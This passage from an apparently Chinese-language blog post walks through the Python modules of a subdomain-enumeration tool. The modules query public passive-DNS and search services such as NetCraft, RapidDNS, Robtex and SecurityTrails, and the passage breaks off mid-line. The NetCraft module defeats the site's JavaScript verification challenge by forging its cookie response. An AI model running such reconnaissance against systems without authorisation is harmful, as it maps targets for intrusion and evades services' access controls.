class="hljs-keyword">try</span>:<br>                json = resp.json()<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, e.args)<br>                <span class="hljs-keyword">break</span><br>            subdomains = self.match_subdomains(<span class="hljs-built_in">str</span>(json))<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> subdomains:<br>                <span class="hljs-keyword">break</span><br>            self.subdomains.update(subdomains)<br>            <span class="hljs-comment"># 不直接使用subdomains是因为可能里面会出现不符合标准的子域名</span><br>            subdomains = json.get(<span class="hljs-string">&#x27;Subdomains&#x27;</span>)<br>            <span class="hljs-keyword">if</span> subdomains <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(subdomains) &lt; <span class="hljs-number">300</span>:<br>                <span class="hljs-comment"># ipv4info子域查询接口每次最多返回300个 用来判断是否还有下一页</span><br>                <span class="hljs-keyword">break</span><br>            page += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> page &gt;= <span class="hljs-number">50</span>:  <span class="hljs-comment"># ipv4info子域查询接口最多允许查询50页</span><br>                <span class="hljs-keyword">break</span><br></code></pre></div></td></tr></table></figure><h2 id="3-13-netcraft"><a href="#3-13-netcraft" class="headerlink" title="3.13 netcraft"></a>3.13 netcraft</h2><p>携带对应的请求参数访问对应的网址，并将返回的内容进行正则匹配子域名</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NetCraft</span>(<span class="hljs-params">Query</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Query.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Dataset&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;NetCraftQuery&#x27;</span><br>        self.init = <span class="hljs-string">&#x27;https://searchdns.netcraft.com/&#x27;</span><br>        self.addr = <span class="hljs-string">&#x27;https://searchdns.netcraft.com/?restriction=site+contains&#x27;</span><br>        self.page_num = <span class="hljs-number">1</span><br>        self.per_page_num = <span class="hljs-number">20</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bypass_verification</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        绕过NetCraft的JS验证</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        resp = self.get(self.init)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> resp:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        self.cookie = resp.cookies<br>        cookie_value = self.cookie[<span class="hljs-string">&#x27;netcraft_js_verification_challenge&#x27;</span>]<br>        cookie_encode = parse.unquote(cookie_value).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        verify_taken = hashlib.sha1(cookie_encode).hexdigest()<br>        self.cookie[<span class="hljs-string">&#x27;netcraft_js_verification_response&#x27;</span>] = verify_taken<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>   <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        向接口查询子域并做子域匹配</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.header = self.get_header()  <span class="hljs-comment"># NetCraft会检查User-Agent</span><br>        self.proxy = self.get_proxy(self.source)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.bypass_verification():<br>            <span class="hljs-keyword">return</span><br>        last = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            time.sleep(self.delay)<br>            self.proxy = self.get_proxy(self.source)<br>            params = &#123;<span class="hljs-string">&#x27;restriction&#x27;</span>: <span class="hljs-string">&#x27;site ends with&#x27;</span>,<br>                      <span class="hljs-string">&#x27;host&#x27;</span>: <span class="hljs-string">&#x27;.&#x27;</span> + self.domain,<br>                      <span class="hljs-string">&#x27;from&#x27;</span>: self.page_num&#125;<br>            resp = self.get(self.addr + last, params)<br>            subdomains = self.match_subdomains(resp)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> subdomains:  <span class="hljs-comment"># 搜索没有发现子域名则停止搜索</span><br>                <span class="hljs-keyword">break</span><br>            self.subdomains.update(subdomains)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Next Page&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> resp.text:  <span class="hljs-comment"># 搜索页面没有出现下一页时停止搜索</span><br>                <span class="hljs-keyword">break</span><br>            last = re.search(<span class="hljs-string">r&#x27;&amp;last=.*&#x27;</span> + self.domain, resp.text).group(<span class="hljs-number">0</span>)<br>            self.page_num += self.per_page_num<br>            <span class="hljs-keyword">if</span> self.page_num &gt; <span class="hljs-number">500</span>:<br>                <span class="hljs-keyword">break</span><br></code></pre></div></td></tr></table></figure><h2 id="3-14-passivedns-api"><a href="#3-14-passivedns-api" class="headerlink" title="3.14 passivedns_api"></a>3.14 passivedns_api</h2><p>携带对应的请求参数访问对应的网址，并将返回的内容进行正则匹配子域名</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PassiveDnsAPI</span>(<span class="hljs-params">Query</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Query.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Dataset&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;PassiveDnsQuery&#x27;</span><br>        self.addr = settings.passivedns_api_addr <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;http://api.passivedns.cn&#x27;</span><br>        self.token = settings.passivedns_api_token<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        向接口查询子域并做子域匹配</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.header = self.get_header()<br>        self.header.update(&#123;<span class="hljs-string">&#x27;X-AuthToken&#x27;</span>: self.token&#125;)<br>        self.proxy = self.get_proxy(self.source)<br>        url = self.addr + <span class="hljs-string">&#x27;/flint/rrset/*.&#x27;</span> + self.domain<br>        resp = self.get(url)<br>        self.subdomains = self.collect_subdomains(resp)<br><br></code></pre></div></td></tr></table></figure><h2 id="3-15-qianxun"><a href="#3-15-qianxun" class="headerlink" title="3.15 qianxun"></a>3.15 qianxun</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">QianXun</span>(<span class="hljs-params">Query</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Query.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Query&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;QianXunQuery&#x27;</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        向接口查询子域并做子域匹配</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.header = self.get_header()<br>        self.proxy = self.get_proxy(self.source)<br><br>        num = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            data = &#123;<span class="hljs-string">&#x27;ecmsfrom&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>,<br>                    <span class="hljs-string">&#x27;show&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>,<br>                    <span class="hljs-string">&#x27;num&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>,<br>                    <span class="hljs-string">&#x27;classid&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br>                    <span class="hljs-string">&#x27;keywords&#x27;</span>: self.domain&#125;<br>            url = <span class="hljs-string">f&#x27;https://www.dnsscan.cn/dns.html?&#x27;</span> \<br>                  <span class="hljs-string">f&#x27;keywords=<span class="hljs-subst">&#123;self.domain&#125;</span>&amp;page=<span class="hljs-subst">&#123;num&#125;</span>&#x27;</span><br>            resp = self.post(url, data)<br>            subdomains = self.match_subdomains(resp)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> subdomains:  <span class="hljs-comment"># 没有发现子域名则停止查询</span><br>                <span class="hljs-keyword">break</span><br>            self.subdomains.update(subdomains)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&lt;div id=&quot;page&quot; class=&quot;pagelist&quot;&gt;&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> resp.text:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&lt;li class=&quot;disabled&quot;&gt;&lt;span&gt;&amp;raquo;&lt;/span&gt;&lt;/li&gt;&#x27;</span> <span class="hljs-keyword">in</span> resp.text:<br>                <span class="hljs-keyword">break</span><br>            num += <span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><h2 id="3-16-rapiddns"><a href="#3-16-rapiddns" class="headerlink" title="3.16 rapiddns"></a>3.16 rapiddns</h2><p>携带对应的请求参数访问对应的网址，并将返回的内容进行正则匹配子域名</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RapidDNS</span>(<span class="hljs-params">Query</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Query.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Dataset&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;RapidDNSQuery&#x27;</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        向接口查询子域并做子域匹配</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.header = self.get_header()<br>        self.proxy = self.get_proxy(self.source)<br>        url = <span class="hljs-string">f&#x27;http://rapiddns.io/subdomain/<span class="hljs-subst">&#123;self.domain&#125;</span>&#x27;</span><br>        params = &#123;<span class="hljs-string">&#x27;full&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>&#125;<br>        resp = self.get(url, params)<br>        self.subdomains = self.collect_subdomains(resp)<br></code></pre></div></td></tr></table></figure><h2 id="3-17-riddler"><a href="#3-17-riddler" class="headerlink" title="3.17 riddler"></a>3.17 riddler</h2><p>携带对应的请求参数访问对应的网址，并将返回的内容进行正则匹配子域名</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Riddler</span>(<span class="hljs-params">Query</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Query.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Dataset&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;RiddlerQuery&#x27;</span><br>        self.addr = <span class="hljs-string">&#x27;https://riddler.io/search&#x27;</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        向接口查询子域并做子域匹配</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.header = self.get_header()<br>        self.proxy = self.get_proxy(self.source)<br>        params = &#123;<span class="hljs-string">&#x27;q&#x27;</span>: <span class="hljs-string">&#x27;pld:&#x27;</span> + self.domain&#125;<br>        resp = self.get(self.addr, params)<br>        self.subdomains = self.collect_subdomains(resp)<br></code></pre></div></td></tr></table></figure><h2 id="3-18-robtex"><a href="#3-18-robtex" class="headerlink" title="3.18 robtex"></a>3.18 robtex</h2><p>携带对应的请求参数访问对应的网址，并将返回的内容进行正则匹配子域名</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Robtex</span>(<span class="hljs-params">Query</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Query.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Dataset&#x27;</span><br>        self.source = <span class="hljs-string">&quot;RobtexQuery&quot;</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        向接口查询子域并做子域匹配</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.header = self.get_header()<br>        self.proxy = self.get_proxy(self.source)<br>        base_addr = <span class="hljs-string">&#x27;https://freeapi.robtex.com/pdns&#x27;</span><br>        url = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;base_addr&#125;</span>/forward/<span class="hljs-subst">&#123;self.domain&#125;</span>&#x27;</span><br>        resp = self.get(url)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> resp:<br>            <span class="hljs-keyword">return</span><br>        text_list = resp.text.splitlines()<br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> text_list:<br>            record = json.loads(item)<br>            <span class="hljs-keyword">if</span> record.get(<span class="hljs-string">&#x27;rrtype&#x27;</span>) <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;AAAA&#x27;</span>]:<br>                time.sleep(self.delay)  <span class="hljs-comment"># Robtex有查询频率限制</span><br>                ip = record.get(<span class="hljs-string">&#x27;rrdata&#x27;</span>)<br>                url = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;base_addr&#125;</span>/reverse/<span class="hljs-subst">&#123;ip&#125;</span>&#x27;</span><br>                resp = self.get(url)<br>                self.subdomains = self.collect_subdomains(resp)<br></code></pre></div></td></tr></table></figure><h2 id="3-19-securitytrails-api"><a href="#3-19-securitytrails-api" class="headerlink" title="3.19 securitytrails_api"></a>3.19 securitytrails_api</h2><p>携带对应的请求参数访问对应的网址，并将返回的内容进行正则匹配子域名</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SecurityTrailsAPI</span>(<span class="hljs-params">Query</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Query.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Dataset&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;SecurityTrailsAPIQuery&#x27;</span><br>        self.addr = <span class="hljs-string">&#x27;https://api.securitytrails.com/v1/domain/&#x27;</span><br>        self.api = settings.securitytrails_api<br>        self.delay = <span class="hljs-number">2</span>  <span class="hljs-comment"># SecurityTrails查询时延至少2秒</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        向接口查询子域并做子域匹配</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.header = self.get_header()<br>        self.proxy = self.get_proxy(self.source)<br>        params = &#123;<span class="hljs-string">&#x27;apikey&#x27;</span>: self.api&#125;<br>        url = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;self.addr&#125;</span><span class="hljs-subst">&#123;self.domain&#125;</span>/subdomains&#x27;</span><br>        resp = self.get(url, params)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> resp:<br>            <span class="hljs-keyword">return</span><br>        prefixs = resp.json()[<span class="hljs-string">&#x27;subdomains&#x27;</span>]<br>        subdomains = [<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>.<span class="hljs-subst">&#123;self.domain&#125;</span>&#x27;</span> <span class="hljs-keyword">for</span> prefix <span class="hljs-keyword">in</span> prefixs]<br>        <span class="hljs-keyword">if</span> subdomains:<br>            self.subdomains.update(subdomains)<br><br></code></pre></div></td></tr></table></figure><h2 id="3-20-sitedossier"><a href="#3-20-sitedossier" class="headerlink" title="3.20 sitedossier"></a>3.20 sitedossier</h2><p>携带对应的请求参数访问对应的网址，并将返回的内容进行正则匹配子域名</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SiteDossier</span>(<span class="hljs-params">Query</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Query.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Dataset&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;SiteDossierQuery&#x27;</span><br>        self.addr = <span class="hljs-string">&#x27;http://www.sitedossier.com/parentdomain/&#x27;</span><br>        self.delay = <span class="hljs-number">2</span><br>        self.page_num = <span class="hljs-number">1</span><br>        self.per_page_num = <span class="hljs-number">100</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        向接口查询子域并做子域匹配</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            self.header = self.get_header()<br>            self.proxy = self.get_proxy(self.source)<br>            url = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;self.addr&#125;</span><span class="hljs-subst">&#123;self.domain&#125;</span>/<span class="hljs-subst">&#123;self.page_num&#125;</span>&#x27;</span><br>            resp = self.get(url)<br>            subdomains = self.match_subdomains(resp)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> subdomains:  <span class="hljs-comment"># 没有发现子域名则停止查询</span><br>                <span class="hljs-keyword">break</span><br>            self.subdomains.update(subdomains)<br>            <span class="hljs-comment"># 搜索页面没有出现下一页时停止搜索</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Show next 100 items&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> resp.text:<br>                <span class="hljs-keyword">break</span><br>            self.page_num += self.per_page_num<br></code></pre></div></td></tr></table></figure><h2 id="3-21-spyse-api"><a href="#3-21-spyse-api" class="headerlink" title="3.21 spyse_api"></a>3.21 spyse_api</h2><p>携带对应的请求参数访问对应的网址，并将返回的内容进行正则匹配子域名</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SpyseAPI</span>(<span class="hljs-params">Query</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Query.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Dataset&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;SpyseAPIQuery&#x27;</span><br>        self.token = settings.spyse_api_token<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        向接口查询子域并做子域匹配</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        limit = <span class="hljs-number">100</span><br>        offset = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            self.header = self.get_header()<br>            self.header.update(&#123;<span class="hljs-string">&#x27;Authorization&#x27;</span>: <span class="hljs-string">&#x27;Bearer &#x27;</span> + self.token&#125;)<br>            self.proxy = self.get_proxy(self.source)<br>            addr = <span class="hljs-string">&#x27;https://api.spyse.com/v3/data/domain/subdomain&#x27;</span><br>            params = &#123;<span class="hljs-string">&#x27;domain&#x27;</span>: self.domain, <span class="hljs-string">&#x27;offset&#x27;</span>: offset, <span class="hljs-string">&#x27;limit&#x27;</span>: limit&#125;<br>            resp = self.get(addr, params)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> resp:<br>                <span class="hljs-keyword">return</span><br>            json = resp.json()<br>            subdomains = self.match_subdomains(<span class="hljs-built_in">str</span>(json))<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> subdomains:  <span class="hljs-comment"># 没有发现子域名则停止查询</span><br>                <span class="hljs-keyword">break</span><br>            self.subdomains.update(subdomains)<br>            offset += limit<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(json.get(<span class="hljs-string">&#x27;data&#x27;</span>).get(<span class="hljs-string">&#x27;items&#x27;</span>)) &lt; limit:<br>                <span class="hljs-keyword">break</span><br></code></pre></div></td></tr></table></figure><h2 id="3-22-sublist3r"><a href="#3-22-sublist3r" class="headerlink" title="3.22 sublist3r"></a>3.22 sublist3r</h2><p>携带对应的请求参数访问对应的网址，并将返回的内容进行正则匹配子域名</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sublist3r</span>(<span class="hljs-params">Query</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Query.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Dataset&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;Sublist3rQuery&#x27;</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        向接口查询子域并做子域匹配</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.header = self.get_header()<br>        self.proxy = self.get_proxy(self.source)<br>        addr = <span class="hljs-string">&#x27;https://api.sublist3r.com/search.php&#x27;</span><br>        param = &#123;<span class="hljs-string">&#x27;domain&#x27;</span>: self.domain&#125;<br>        resp 